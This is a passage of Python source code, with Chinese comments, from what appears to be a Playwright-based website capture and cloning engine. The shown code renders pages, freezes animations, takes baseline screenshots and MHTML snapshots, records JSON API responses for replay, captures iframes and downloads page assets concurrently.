            inflight.pop(id(req), None)

        page.on("request", _on_req)
        page.on("requestfinished", _on_done)
        page.on("requestfailed", _on_done)
        try:
            with suppress(Exception):
                page.wait_for_load_state("load", timeout=cap_ms)
            deadline = time.monotonic() + cap_ms / 1000
            while time.monotonic() < deadline:
                now = time.monotonic()
                live = sum(1 for t in inflight.values() if now - t < stale_s)
                if not live and now - last[0] >= quiet_s:
                    return True
                page.wait_for_timeout(100)
            return False
        finally:
            for ev, fn in (("request", _on_req), ("requestfinished", _on_done),
                           ("requestfailed", _on_done)):
                with suppress(Exception):
                    page.remove_listener(ev, fn)

    @staticmethod
    def _probe_unreachable(ctx, url: str):
        """网络层可达性探测: 返回不可达原因, 可达(任何 HTTP 状态)返回 None。"""
        try:
            resp = ctx.request.get(url, timeout=config.REACHABILITY_PROBE_TIMEOUT,
                                   max_redirects=5, fail_on_status_code=False)
            with suppress(Exception):
                resp.dispose()
            return None
        except Exception as exc:
            msg = str(exc)
            m = re.search(r"(net::ERR_[A-Z_]+|ERR_[A-Z_]+|Timeout \d+ms exceeded|"
                          r"getaddrinfo \w+|ECONNREFUSED|ECONNRESET|ETIMEDOUT|EHOSTUNREACH|ENETUNREACH)", msg)
            return m.group(1) if m else f"{type(exc).__name__}: {msg[:80]}"

    def _render_page(self, ctx, url: str, screenshot: bool, collect_links: bool):
        page = ctx.new_page()
        rt = self.cfg.get("render_timeout")  # 批次级页面加载超时(秒), 0/缺省 = 平台默认
        try:
            page.set_default_timeout(int(float(rt) * 1000) if rt else config.PAGELOAD_TIMEOUT)
        except (TypeError, ValueError):
            page.set_default_timeout(config.PAGELOAD_TIMEOUT)
        if self.cfg.get("mock_api", True):
            page.on("response", self._on_response)
        page.on("response", self._on_asset_response)  # 活体资源采集(恒开)
        self.log("RENDER", f"导航 {url}")
        t_nav, t_nav_m = time.time(), time.monotonic()
        try:
            page.goto(url, wait_until="domcontentloaded", timeout=config.PAGELOAD_TIMEOUT)
        except Exception as exc:
            # 首导航瞬时失败(超时/连接抖动): 先用轻量请求探测网络层可达性 ——
            # 不可达(DNS/连接/超时)直接判失败, 不再白等第二个 45s 导航;
            # 可达才重试导航, 防慢站一票判死
            if any(m in str(exc) for m in ("Timeout", "ERR_", "net::")):
                reason = self._probe_unreachable(ctx, url)
                if reason:
                    self.log("RENDER", f"首导航失败且目标网络层不可达({reason}), 快速失败")
                    raise TargetUnreachable(f"目标不可达(网络层): {reason}; 首导航: "
                                            f"{type(exc).__name__}: {str(exc)[:200]}") from exc
                self.log("RENDER", f"首导航失败({type(exc).__name__}), 目标可达, 重试一次")
                page.goto(url, wait_until="domcontentloaded", timeout=config.PAGELOAD_TIMEOUT)
            else:
                raise
        if not self._wait_quiet(page, config.NETWORK_IDLE_TIMEOUT):
            self.log("RENDER", "网络静置等待超时, 继续后续固化流程")
        self.log("RENDER", f"页面就绪 {time.time() - t_nav:.1f}s")
        if screenshot:
            with suppress(Exception):
                rt = page.evaluate(RUNTIME_FP_JS) or []
                self._runtime_hits = set(rt)
                if rt:
                    self.log("PATTERN", f"活体运行时证据: {', '.join(rt)}")
        tp = self._phase("采集-导航", t_nav_m)
        self._auto_settle_update_prompt(page)
        # 采集期主框架导航冻结: wikipedia 等站在固化序列中途自导航
        # (重定向/落地切换)会撕裂 evaluate 会话("Execution context
        # destroyed")—— abort 后续主框架导航, 按当前已渲染 DOM 采集
        def _freeze_main_nav(route):
            try:
                req = route.request
                if (req.frame == page.main_frame and req.is_navigation_request()
                        and req.url != url):
                    with suppress(Exception):
                        route.abort()
                    return
                with suppress(Exception):
                    route.continue_()
            except Exception:
                with suppress(Exception):
                    route.abort()
        with suppress(Exception):
            page.route("**/*", _freeze_main_nav)

        def _safe_eval(script, tries=3):
            """导航撕裂感知 evaluate: 等待重试而非整链报废。"""
            last = None
            for attempt in range(tries):
                try:
                    return page.evaluate(script)
                except Exception as exc:
                    last = exc
                    if "Execution context" not in str(exc) and "Target closed" not in str(exc):
                        raise
                    with suppress(Exception):
                        page.wait_for_load_state("load", timeout=8000)
                    page.wait_for_timeout(800)
            raise last

        lazy_count = _safe_eval(LAZY_JS)
        if lazy_count:
            self.log("RENDER", f"触发 {lazy_count} 个懒加载资源")
        self._auto_scroll(page)
        self.log("RENDER", f"懒加载与滚动完成 {time.time() - t_nav:.1f}s")
        tp = self._phase("采集-懒加载滚动", tp)
        if screenshot:
            self._probe_viewports(page)
            tp = self._phase("采集-多视口内联", tp)
        # 评分基准(纯净原站): 必须在任何引擎 DOM 改动(表单激活/DEEP_FREEZE/
        # 水合剥离/字体烘焙)之前截取 —— 否则评分比较的是"克隆 vs 引擎改过的
        # 原站", 引擎自身引入的失真被基准同步吸收, 分数系统性偏乐观。
        baseline_text = None
        layout_stable = []
        if screenshot:
            with suppress(OSError):   # 重建/重试: 清掉上一轮基准, 防口径混用
                (self.ws / "original_preview.png").unlink()
            layout_pre = None
            with suppress(Exception):
                layout_pre = _safe_eval(f"() => ({LAYOUT_MAP_JS})({LAYOUT_MAP_MAX})")
            # 图片未到齐就截基准, 克隆(资源池更全)反被扣分: cn.vuejs 赞助商图床慢时
            # 基准里整区空白格子而克隆是满的(-15 分)。可见图仍在加载就再等一会(封顶)
            with suppress(Exception):
                # 与克隆侧同口径: 克隆截图前懒加载图全部转 eager(见 _load_clone), 基准不转
                # 就是"克隆满、基准空"(mi.com 轮播页尾整块空白 -5 分)
                page.evaluate(BASELINE_EAGER_JS, config.BASELINE_EAGER_MAX)
                pending = page.evaluate(IMG_PENDING_JS)
                if pending:
                    t_img = time.monotonic()
                    # 有进展才继续等: 连续 STALL 内一张都没到齐即放行(坏图床/永不加载的图不空等到上限)
                    deadline = t_img + config.BASELINE_IMG_WAIT_MS / 1000
                    last_n, last_t = pending, t_img
                    while time.monotonic() < deadline:
                        page.wait_for_timeout(250)
                        try:
                            n = page.evaluate(IMG_PENDING_JS)
                        except Exception:
                            break
                        now = time.monotonic()
                        if not n:
                            break
                        if n < last_n:
                            last_n, last_t = n, now
                        elif now - last_t >= config.BASELINE_IMG_STALL_MS / 1000:
                            break
                    self.log("RENDER", f"基准截图前等待 {pending} 张加载中的图片 "
                                       f"{time.monotonic() - t_img:.1f}s")
            with suppress(Exception):
                frz = _safe_eval(TIME_FREEZE_JS)
                if frz.get("anims"):
                    self.log("RENDER", f"时间冻结: 暂停 {frz['anims']} 个动画, "
                                       f"清空定时器 {frz.get('timers', 0)} 个")
            t_frz = time.monotonic()
            # 冻结后再等一轮可见图: 上面等图期间轮播定时器还在翻页, 冻结那一刻露出的往往
            # 是刚翻到、图还没到的一页(mi.com 基准整屏空白)。冻结后版面不再动, 等的就是截图里那几张
            with suppress(Exception):
                pending = page.evaluate(IMG_PENDING_JS)
                if pending:
                    t_img = time.monotonic()
                    deadline = t_img + config.BASELINE_IMG_FROZEN_WAIT_MS / 1000
                    while time.monotonic() < deadline and page.evaluate(IMG_PENDING_JS):
                        page.wait_for_timeout(200)
                    self.log("RENDER", f"冻结后补等 {pending} 张可见图 {time.monotonic() - t_img:.1f}s")
            with suppress(Exception):
                left = config.BASELINE_TWEEN_SETTLE_MS / 1000 - (time.monotonic() - t_frz)
                if left > 0:
                    page.wait_for_timeout(int(left * 1000))
                _safe_eval(RAF_FREEZE_JS)
            try:
                self._full_shot(page, self.ws / "original_preview.png", "原站")
                baseline_text = _safe_eval(TEXT_EXTRACT_JS)
                with suppress(Exception):
                    page.evaluate(MARK_LOADED_IMGS_JS)
                self.log("RENDER", "原站纯净基准快照已保存(DOM 改动前)")
            except Exception as exc:
                self.log("WARN", f"原站截图失败: {exc}")
            with suppress(Exception):
                n_wa = _safe_eval(WAAPI_BAKE_JS)
                if n_wa:
                    self.log("RENDER", f"脚本动画烘焙: {n_wa} 个 WAAPI 动画按截图时刻写成内联样式")
            with suppress(Exception):
                n_ph = _safe_eval(ANIM_PHASE_JS)
                if n_ph:
                    self.log("RENDER", f"动画相位固化: {n_ph} 个元素按截图时刻起播")
        if screenshot and layout_pre and (self.ws / "original_preview.png").is_file():
            # 截图前后各采一次, 只留尺寸未变的块: 动画/逐帧增长的块真实基准高度不可知,
            # 拿它校准只会把克隆拉向另一个时刻
            with suppress(Exception):
                post = {e[0]: e[2] for e in _safe_eval(
                    f"() => ({LAYOUT_MAP_JS})({LAYOUT_MAP_MAX})")}
                stable = [e for e in layout_pre if abs(post.get(e[0], -99) - e[2]) <= 1]
                layout_stable = stable
                (self.ws / "layout_map.json").write_text(
                    json.dumps(stable, ensure_ascii=False), encoding="utf-8")
        tp = self._phase("采集-基准截图", tp)
        if screenshot and (self.ws / "original_preview.png").is_file():
            self._freeze_media_from_baseline(page)
        activated = _safe_eval(FORM_ACTIVATE_JS)
        if activated:
            self.log("RENDER", f"表单激活: focus/blur {activated} 个输入控件")
        counts = _safe_eval(DEEP_FREEZE_JS)
        if layout_stable:
            # DEEP_FREEZE 已停掉定时器: 此后页面脚本不再改 DOM, 回撤结果能留到序列化
            with suppress(Exception):
                n_rev = page.evaluate(COLLAPSE_REVERT_JS, [e[0] for e in layout_stable if e[2] > 0])
                if n_rev:
                    self.log("RENDER", f"基准后塌陷回撤: {n_rev} 个块在基准截图后被脚本收起, 按基准保留占位")
        self.log("CSSOM",
                 f"固化 {counts.get('css', 0)} 组运行时样式 / "
                 f"{counts.get('canvas', 0)} 个 Canvas / "
                 f"{counts.get('revealed', 0)} 个动画元素显形 / "
                 f"{counts.get('crossOriginSheets', 0)} 个跨域样式表")
        # W7: 水合剥离决策(模式策略包 + 活体早识别)。
        # SSR/水合模式的静态 DOM 是权威渲染(采集期已完整), 而水合重渲染
        # 会用客户端数据替换它(实证: tailwind marquee 87→44 退化链)。
        # 活体探测 Next/Nuxt 家族 → 剥离水合脚本, 保静态 DOM 到序列化。
        strip_hydration = bool(self.cfg.get("disable_hydration"))
        if not strip_hydration:
            try:
                fam = _safe_eval("""() => ({
                    next: !!(window.__next_f || document.querySelector('script[src*="/_next/"]')),
                    nuxt: !!(window.__NUXT__ || document.querySelector('script[src*="/_nuxt/"]'))
                })""")
                strip_hydration = bool(fam.get("next") or fam.get("nuxt"))
            except Exception:
                strip_hydration = False
        if strip_hydration:
            removed = _safe_eval(REMOVE_SCRIPTS_JS)
            self.log("RENDER", f"水合剥离(静态 DOM 权威): 已剥离 {removed} 个水合脚本")
        # A2 字体度量固化(W7): 活体 computed font 采样为 !important 覆盖,
        # 序列化进 HTML/MHTML —— 回放文本度量与采集态一致。
        try:
            baked = _safe_eval(FONT_BAKE_JS)
            if baked:
                self.log("RENDER", f"字体度量固化: {baked} 个元素逐元素烘焙(差分继承)")
        except Exception:
            pass
        with suppress(Exception):
            fl = _safe_eval(INLINE_FLUID_JS) or {}
            if any(fl.values()):
                self.log("RENDER", f"内联尺寸流式化: 全宽 {fl.get('width', 0)} / 轨道 {fl.get('track', 0)}"
                                   f" / 位移 {fl.get('shift', 0)}(采集视口下不变, 换视口随容器伸缩)")
        with suppress(Exception):
            loads = self._collect_narrow_loads()
            cv = page.evaluate(CV_EMIT_JS, loads) or {}
            if cv.get("els"):
                self.log("RENDER", f"多视口内联样式: {cv['els']} 个元素, {cv.get('vw', 0)} 个按视口宽比例改写为 vw,"
                                   f" {cv.get('banded', 0)} 个移入分视口样式表(其中窄屏首载补采 {cv.get('reload', 0)})")
        # N1 保真轨: MHTML 快照(采集期活体渲染的权威固化)。
        # Chromium 对 MHTML 的回放默认禁脚本 —— 确定性由构造保证。
        if screenshot:
            try:
                cdp = ctx.new_cdp_session(page)
                snap = cdp.send('Page.captureSnapshot', {'format': 'mhtml'})
                (self.ws / 'capture.mhtml').write_text(snap['data'], encoding='utf-8')
                self.log("RENDER", f"保真轨 MHTML 快照: {len(snap['data']) // 1024} KB")
            except Exception as exc:
                self.log("WARN", f"MHTML 快照失败: {exc}")
            finally:
                with suppress(Exception):
                    cdp.detach()
        self.db.touch_task(self.task_id)   # 采集心跳: 长下载阶段防误收割
        if screenshot:
            with suppress(Exception):
                probe = _safe_eval(PAGE_PROBE_JS)
                self.log("RENDER", "版面特征: " + ", ".join(f"{k}={v}" for k, v in probe.items()))
        hidden_frames = 0
        with suppress(Exception):
            hidden_frames = int(_safe_eval(MARK_HIDDEN_FRAMES_JS) or 0)
        html = None
        try:
            shadow = _safe_eval(SHADOW_SERIALIZE_JS)
            if shadow and shadow.get("html"):
                html = shadow["html"]
                self.log("RENDER", f"Shadow DOM 声明式序列化: {shadow['roots']} 个开放影子根"
                                   f"(物化 {shadow['adopted']} 组构造样式表)")
        except Exception as exc:
            self.log("WARN", f"Shadow DOM 序列化失败, 回退 outerHTML: {exc}")
        if html is None:
            html = _safe_eval(OUTER_HTML_JS)
        html = self._inline_blob_urls(page, html)
        # N1.1 采集退化守卫: 序列化过薄(<5KB)说明页面在采集窗口内被
        # 重定向/挂载失败清空(ibm 类 React 壳) —— 重新导航再序列化一次
        if len(html) < 5000:
            self.log("RENDER", f"序列化过薄({len(html)}B), 判定采集退化, 重导航重试")
            try:
                page.goto(url, wait_until="domcontentloaded", timeout=config.PAGELOAD_TIMEOUT)
                with suppress(Exception):
                    page.wait_for_load_state("networkidle", timeout=config.NETWORK_IDLE_TIMEOUT)
                page.wait_for_timeout(2500)
                retried = _safe_eval(OUTER_HTML_JS)
                self.log("RENDER", f"重试后序列化: {len(retried)}B")
                # 只接受更完整的结果: 小体量合法页面重导航后反而丢失采集期固化
                if len(retried) > len(html):
                    html = retried
            except Exception as exc:
                self.log("WARN", f"退化重试失败: {exc}")
        if hidden_frames:
            html, n_blank = _blank_hidden_frames(html)
            if n_blank:
                self.log("RENDER", f"不可见 iframe 置空: {n_blank} 个(埋点/像素沙盒, 克隆里不再加载活体)")
        text = _safe_eval(TEXT_EXTRACT_JS)
        if screenshot and baseline_text is not None:
            # 原站文本指纹与基准截图同口径(改动前), 采集期显形内容不计入
            text = baseline_text
        if screenshot and not (self.ws / "original_preview.png").is_file():
            # 基准截图失败时的兜底(改动后截图, 记日志以便账本区分口径)
            try:
                self._full_shot(page, self.ws / "original_preview.png", "原站")
                self.log("WARN", "原站基准快照回退为改动后截图(口径偏乐观)")
            except Exception as exc:
                self.log("WARN", f"原站截图失败: {exc}")
        tp = self._phase("采集-固化", tp)
        collected = _safe_eval(COLLECT_ASSETS_JS)
        iframes = _safe_eval(IFRAME_EXTRACT_JS)
        iframe_srcs = _safe_eval(IFRAME_SRCS_JS)
        # 活体子 frame 的 DOM(含跨域 OOPIF, Playwright 不受同源限制): 供顶级导航被
        # 弹回宿主时兜底固化 —— 登录/SSO 组件只有嵌在宿主里才渲染自身
        live_frames = {}
        if iframe_srcs:
            for fr in page.frames[1:1 + config.MAX_FRAME_PAGES * 2]:
                with suppress(Exception):
                    if fr.url.startswith(("http://", "https://")):
                        live_frames[fr.url] = fr.content()
        links = _safe_eval(COLLECT_LINKS_JS) if collect_links else []
        if collect_links:
            self.log("CRAWL", f"发现 {len(links)} 个同域候选链接")
        state = None
        if screenshot:  # 仅主页面快照 Cookie/Storage 终态
            try:
                storage = page.evaluate(STORAGE_SNAPSHOT_JS)
                state = {"cookies": ctx.cookies(), "local": storage.get("local", {}),
                         "session": storage.get("session", {})}
            except Exception as exc:
                self.log("WARN", f"状态快照失败: {exc}")
        with suppress(Exception):
            self._harvest_live_bodies()
        self._phase("采集-收尾", tp)
        final_url = url
        with suppress(Exception):
            final_url = page.url or url
        with suppress(Exception):
            page.close()
        return {"final_url": final_url,
                "html": html, "text": text, "urls": collected["urls"],
                "srcsets": collected["srcsets"], "rawRefs": collected["rawRefs"],
                "links": links, "iframes": iframes, "iframe_srcs": iframe_srcs,
                "live_frames": live_frames,
                "state": state}

    def _auto_settle_update_prompt(self, page, max_rounds: int = 2):
        """活体渲染期主动走完"版本升级弹层"流程。

        首访弹升级框并自动 reload 的 SPA(灰度发布体系), 必须在冻结前点击
        "立即自动更新"让浏览器拿到新版页面 —— 冻结的是升级完成后的自洽终态;
        克隆侧再配合 state_snapshot 恢复 Cookie, 版本守卫判定通过不再弹框。
        """
        for _round in range(max_rounds):
            try:
                probe = page.evaluate(UPDATE_PROMPT_PROBE_JS)
            except Exception:
                return
            if not probe or not probe.get("found"):
                return
            self.log("RENDER",
                     f"检测到版本升级弹层({(probe.get('text') or '')[:50]}…), "
                     f"自动执行更新流程")
            try:
                clicked = page.evaluate(UPDATE_PROMPT_CLICK_JS)
            except Exception:
                clicked = None
            if not clicked:
                self.log("WARN", "升级弹层未找到可点击的更新按钮, 继续原流程")
                return
            try:
                page.wait_for_load_state("domcontentloaded",
                                         timeout=config.PAGELOAD_TIMEOUT)
                page.wait_for_load_state("networkidle",
                                         timeout=config.NETWORK_IDLE_TIMEOUT)
            except Exception:
                pass
            page.wait_for_timeout(1500)

    def _auto_scroll(self, page):
        """分步滚动到底再回顶, 触发 IntersectionObserver / 无限加载。
        总时长受 AUTO_SCROLL_BUDGET 约束 —— 主线程被
        WebGL/滚动动画占满的重页(CI 软件渲染下单次 evaluate 可达数秒)不再拖满 60 步。"""
        deadline = time.monotonic() + config.AUTO_SCROLL_BUDGET
        try:
            step = 900
            position = 0
            for _ in range(60):
                position += step
                # 滚动 + 等待 + 取高合并为一次往返(重页上每次 evaluate 都要排主线程)
                height = page.evaluate(
                    "async p => { window.scrollTo(0, p); "
                    "await new Promise(r => setTimeout(r, 320)); "
                    "return document.documentElement.scrollHeight; }", position)
                if position >= height:
                    break
                if time.monotonic() > deadline:
                    self.log("RENDER", f"自动滚动达到时限({config.AUTO_SCROLL_BUDGET}s), "
                                       f"停在 {position}/{height}px")
                    break
            page.wait_for_timeout(600)
            page.evaluate("window.scrollTo(0, 0)")
            page.wait_for_timeout(400)
        except Exception as exc:
            self.log("WARN", f"自动滚动中断: {exc}")

    # ------------------------------------------------------------------
    def _collect_frame_pages(self, ctx, page_result, out_frames, merge_assets,
                             depth: int, target_url: str):
        """iframe 递归固化: 未被同源 DOM 提取覆盖的 iframe 以顶级页面渲染。

        跨域 iframe(如 CAS/SSO 登录组件)的 contentDocument 不可读, 但以
        顶级页面导航时不受 X-Frame-Options 约束, 可完整固化。
        """
        if depth > config.MAX_FRAME_DEPTH or len(out_frames) >= config.MAX_FRAME_PAGES:
            return
        extracted_srcs = {frame.get("src") for frame in page_result.get("iframes", [])}
        seen_srcs = {src for src, _html, _text in out_frames} | {target_url}
        for src in page_result.get("iframe_srcs", []) or []:
            if len(out_frames) >= config.MAX_FRAME_PAGES:
                return
            if src in extracted_srcs or src in seen_srcs:
                continue  # 同源已 DOM 提取 / 自引用 / 已固化
            try:
                sub = self._render_page(ctx, src, screenshot=False,
                                        collect_links=False)
            except Exception as exc:
                self.log("WARN", f"iframe 固化失败 {src[:100]}: {exc}")
                continue
            if _frame_bounced(src, sub.get("final_url") or src, target_url):
                # 登录/SSO 组件发现自己不在 iframe 里会按 ReturnUrl 跳回宿主页: 固化下来的
                # 是宿主首页而非组件(jd 登录弹层里塞进了一个缩小的京东首页)。
                # 改取宿主活体页里该 frame 的 DOM; 取不到则保留原 src 不固化。
                live_html = _match_live_frame(src, page_result.get("live_frames") or {})
                if live_html:
                    # 活体 frame DOM 没经过采集脚本, 它引用的样式/图片从未进资源池, 离线
                    # 回放全是外链(jd 登录框图标/二维码/样式全丢)。按 frame 地址静态提取引用补进去
                    with suppress(Exception):
                        merge_assets(_static_refs(live_html, src))
                    out_frames.append((src, live_html, ""))
                    self.log("RENDER", f"iframe 顶级导航被重定向, 改用宿主内活体 frame DOM "
                                       f"固化: {src[:100]}")
                else:
                    self.log("WARN", f"iframe 顶级导航被重定向({src[:80]} → "
                                     f"{(sub.get('final_url') or '')[:80]}), 不固化")
                continue
            merge_assets(sub)
            out_frames.append((src, sub["html"], sub.get("text") or ""))
            self.log("RENDER", f"跨域 iframe 已固化为本地子页: {src[:100]}")
            self._collect_frame_pages(ctx, sub, out_frames, merge_assets,
                                      depth + 1, target_url)

    # ------------------------------------------------------------------
    def _on_response(self, response):
        try:
            if not self.cfg.get("mock_api", True):
                return
            request = response.request
            if request.method not in ("GET", "POST", "PUT", "PATCH", "DELETE"):
                return
            if request.resource_type not in ("xhr", "fetch"):
                return
            content_type = response.headers.get("content-type", "")
            parts = urlsplit(response.url)
            body = None
            # VCR 网络磁带(W3 安全协商版): 录制 JSON 数据接口 + x-component
            # RSC 导航载荷。回放侧由请求方 Accept 协商精确供给 —— 文档导航
            # (Accept text/html 开头)永不命中, RSC 载荷仅供给自带
            # Accept: text/x-component 的客户端路由 fetch(见 _tape_for);
            # 流式(event-stream)/分段(multipart)协议不录。
            tape_wanted = (config.TAPE_RECORD and response.status < 400
                           and ("json" in content_type or "x-component" in content_type)
                           and "event-stream" not in content_type
                           and "multipart" not in content_type)
            if tape_wanted:
                try:
                    body = response.text()
                except Exception:
                    body = None
                if body and len(body) <= config.MAX_TAPE_BODY_BYTES \
                        and self._tape_bytes < config.MAX_TAPE_TOTAL_BYTES:
                    key = (request.method, parts.path or "/", parts.query)
                    if key not in self._tape_seen:
                        self._tape_seen.add(key)
                        self._net_tape.append({
                            "path": parts.path or "/",
                            "method": request.method,
                            "query": parts.query,
                            "status": response.status,
                            "content_type": content_type or "application/json",
                            "response_body": body,
                        })
                        self._tape_bytes += len(body)
            if "json" not in content_type:
                return
            body = body if body is not None else response.text()
            if not body or len(body) > config.MAX_MOCK_BODY_BYTES:
                return
            self._mock_raw.append({
                "path": parts.path or "/",
                "method": request.method,
                "query": parts.query,
                "status": response.status,
                "response_body": body,
            })
            self.log("MOCK-API",
                     f"录制 {request.method} {parts.path} ({response.status})")
        except Exception:
            return

    def _on_asset_response(self, response):
        """活体资源采集: 浏览器渲染期真实成功加载的静态资源清单。"""
        try:
            if response.status >= 400:
                return
            request = response.request
            rtype = request.resource_type
            if rtype in ("fetch", "xhr") and response.url.startswith(("http://", "https://")):
                ctype = ""
                with suppress(Exception):
                    ctype = response.headers.get("content-type", "")
                if _is_runtime_asset(response.url, ctype):
                    # 只登记, 不进活体响应体复用: fetch 取的媒体可能是永不结束的流(直播/长连接),
                    # 收尾时 resp.body() 会永久等待, 整个任务卡在采集阶段; 交给回补按网络限时下载
                    self._live_seen.setdefault(response.url, "runtime")
                return
            if rtype not in ASSET_RESOURCE_TYPES:
                return
            self._live_seen[response.url] = rtype
            if response.status == 200 and request.resource_type in _LIVE_BODY_TYPES \
                    and len(self._live_resp) < config.LIVE_BODY_MAX \
                    and response.url.startswith(("http://", "https://")):
                self._live_resp.setdefault(response.url, response)
        except Exception:
            return

    def _harvest_live_bodies(self):
        """页面关闭前把浏览器已加载资源的响应体取回(CDP 本地读取, 毫秒级)。

        CAS 下载与活体回补原先把浏览器刚加载过的资源再从网络各下一遍: 慢站 CAS 20~30s、
        活体回补串行逐个 fetch 再 20~45s(jd/techcrunch)。字节就是浏览器实际渲染用的那份
        (含 Accept 协商出的 webp/avif), 比重下更忠实; 取不到(已被逐出/重定向)的照常走网络。"""
        t0, n = time.monotonic(), 0
        pending, self._live_resp = self._live_resp, {}
        for url, resp in pending.items():
            if url in self._live_bodies or self._live_body_bytes >= config.LIVE_BODY_BYTES:
                continue
            try:
                body = resp.body()
            except Exception:
                continue
            if not body or len(body) > config.MAX_ASSET_BYTES:
                continue
            ctype = ""
            with suppress(Exception):
                ctype = (resp.headers.get("content-type") or "").split(";")[0].strip().lower()
            self._live_bodies[url] = {"url": url, "ok": True, "content": body,
                                      "content_type": ctype, "error": "", "ext": ".bin",
                                      "is_css": False, "status": 200, "via": "live"}
            self._live_body_bytes += len(body)
            n += 1
        if n:
            self.log("SMART-DL", f"活体响应体复用: 取回 {n} 个已加载资源 "
                                 f"({self._live_body_bytes // 1024} KB, {time.monotonic() - t0:.1f}s)")

    def _finalize_mocks(self):
        entries, seen = [], set()
        for entry in self._mock_raw:
            key = (entry["method"], entry["path"], entry["query"])
            if key in seen:
                continue
            seen.add(key)
            entries.append(entry)
            if len(entries) >= config.MAX_MOCK_ENTRIES:
                break
        return entries

    # ------------------------------------------------------------------
    def _normalize_out(self, out: dict) -> dict:
        """统一规范化下载结果: 清洗扩展名 + 防污染校验。"""
        if not out.get("ok"):
            return out
        content_type = out.get("content_type") or ""
        path_ext = os_ext(urlsplit(out["url"]).path)
        if not path_ext:
            path_ext = config.CONTENT_TYPE_FALLBACK.get(content_type, ".bin")
        category = config.EXT_CATEGORIES.get(path_ext, "")
        if category in PROTECTED_CATEGORIES and content_type in HTML_INTERCEPT_TYPES:
            out = dict(out)
            out["ok"] = False
            out["error"] = f"content-type 拦截页 ({content_type})"
            return out
        # 内容级防毒: SPA fallback 可能伪装 content-type(或缺失), 对受保护
        # 类别(js/css 等)直接看字节 —— 真实 JS/CSS 不会以 <!DOCTYPE/<html 开头
        if category in PROTECTED_CATEGORIES and out.get("content"):
            head = bytes(out["content"][:512]).lstrip()
            if head[:9] == b"<!DOCTYPE" or head[:5].lower() == b"<html":
                out = dict(out)
                out["ok"] = False
                out["error"] = "SPA fallback HTML(内容级拦截)"
                return out
        out = dict(out)
        out["ext"] = path_ext if path_ext.startswith(".") else ".bin"
        out["is_css"] = ("css" in content_type or path_ext == ".css")
        return out

    # ------------------------------------------------------------------
    def _materialize(self, assets: set, origin: str, ctx=None, results: dict = None):
        """CAS 并发下载(L1 requests 线程池) + 失败 URL 浏览器会话降级(L2)
        + CSS 深度递归。results 可跨调用累积(回补循环复用)。"""
        results = results if results is not None else {}
        jobs = deque()
        # 样式表独立队列、永远先发: 样式内引用(活体字体切片可达数百个)插队时只能排在
        # 剩余样式表之后 —— mi 曾被首个 CSS 的 300+ 字体切片吃光名额, 主样式表没进队列
        css_jobs = deque()
        page_netloc = urlsplit(self._target).netloc
        seeded = set()
        for url in results:
            seeded.update(self._variants(url, page_netloc))
        # 名额优先级: 样式/字体/图片/媒体先排, 脚本最后(单任务条目上限下, 字母序曾让
        # 数百个同源 JS 分包吃光名额而图片 0 张; 且应用脚本多半会被水合剥离)
        live = getattr(self, "_live_seen", None) or {}
        for url in sorted(assets, key=lambda u: _asset_priority(u, live)):
            if url.startswith(("http://", "https://")) and url not in seeded:
                (css_jobs if _asset_priority(url)[1] == 0 else jobs).append(
                    {"url": url, "referer": origin + "/"})
        seen = set(seeded)
        css_sources, css_refs = {}, {}
        failed_for_browser = []
        total, downloaded = len(jobs) + len(css_jobs), 0
        executor = ThreadPoolExecutor(max_workers=config.DOWNLOAD_WORKERS)
        in_flight = {}   # future -> job
        max_inflight = config.DOWNLOAD_WORKERS * 2

        # 主机 -> 网络层失败次数(无 HTTP 状态: SSL/超时/连接错误); 任务级, 跨回补调用累积
        host_fail = self.__dict__.setdefault("_host_fail", {})
        tripped = self.__dict__.setdefault("_host_tripped", set())

        def _pump():
            # 流式调度: 队列里有活、在飞的不满就提交; 不再按 32 个一批等最慢者
            while (css_jobs or jobs) and len(in_flight) < max_inflight:
                job = (css_jobs or jobs).popleft()
                if job["url"] in seen:
                    continue
                if (urlsplit(job["url"]).hostname or "") in tripped:
                    seen.add(job["url"])
                    continue   # 熔断: 该主机网络层已连续失败, 余下请求不再空等超时
                seen.add(job["url"])
                in_flight[executor.submit(self._fetch_asset, job)] = job

        try:
            _pump()
            while in_flight and len(results) < config.MAX_ASSETS_PER_TASK:
                done, _pending = _wait_futures(list(in_flight), return_when=FIRST_COMPLETED)
                for fut in done:
                    job = in_flight.pop(fut, None)
                    if job is None:
                        continue   # 已被主机熔断放弃
                    if len(results) >= config.MAX_ASSETS_PER_TASK:
                        continue
                    try:
                        out = fut.result()
                    except Exception as exc:   # noqa: BLE001 下载线程兜底
                        out = {"url": job["url"], "ok": False, "error": type(exc).__name__}
                    out = self._normalize_out(out)
                    if not out["ok"]:
                        self.log("WARN", f"跳过 {job['url']}: {out['error']}")
                        if out.get("status") and ctx is not None:
                            failed_for_browser.append(job)
                        elif not out.get("status") and str(out.get("error") or "").endswith(
                                ("Error", "Timeout", "TimeoutError")):
                            h = urlsplit(job["url"]).hostname or ""
                            host_fail[h] = host_fail.get(h, 0) + 1
                            if host_fail[h] >= config.HOST_FAIL_TRIP and h not in tripped:
                                tripped.add(h)
                                # 已在飞的同主机请求也不再等(否则仍要逐个等满读超时)
                                dropped = 0
                                for f2, j2 in list(in_flight.items()):
                                    if (urlsplit(j2["url"]).hostname or "") == h:
                                        f2.cancel()
                                        in_flight.pop(f2, None)
                                        dropped += 1
                                self.log("SMART-DL", f"主机熔断: {h} 网络层连续失败 "
                                                     f"{host_fail[h]} 次, 余下请求跳过"
                                                     f"(放弃在飞 {dropped} 个)")
                        continue
                    info = self._store(out)
                    results[out["url"]] = info
                    downloaded += 1
                    if downloaded % 8 == 0 or not (jobs or css_jobs):
                        done_ratio = downloaded / max(total, 1)
                        self._set(progress=min(58, 30 + int(24 * done_ratio)))
                    tag = "CAS-HIT" if info["hit"] else "CAS-MISS"
                    self.log(tag, f"{info['cat']}/{info['name']} "
                                  f"({_fmt_size(info['size'])}) <- {out['url'][:110]}")
                    if out["is_css"]:
                        text = out["content"].decode("utf-8", "replace")
                        css_sources[out["url"]] = text
                        refs = parse_css_refs(text, out["url"])
                        css_refs[out["url"]] = refs
                        for raw, absolute in refs:
                            if absolute not in seen:
                                # 样式内引用: 活体加载过的或图片插队; 未用到的字体切片排队尾
                                job2 = {"url": absolute, "referer": out["url"]}
                                pr = _asset_priority(absolute, live)
                                if pr[1] == 0:
                                    css_jobs.append(job2)   # @import
                                elif pr[0] == 0 or pr[1] <= 1:
                                    jobs.appendleft(job2)
                                else:
                                    jobs.append(job2)
                                total += 1
                _pump()

            # L2: requests 被拒的资源用浏览器会话逐个降级重试(同线程, Playwright 线程亲和)
            if ctx is not None and failed_for_browser:
                for job in failed_for_browser[:30]:
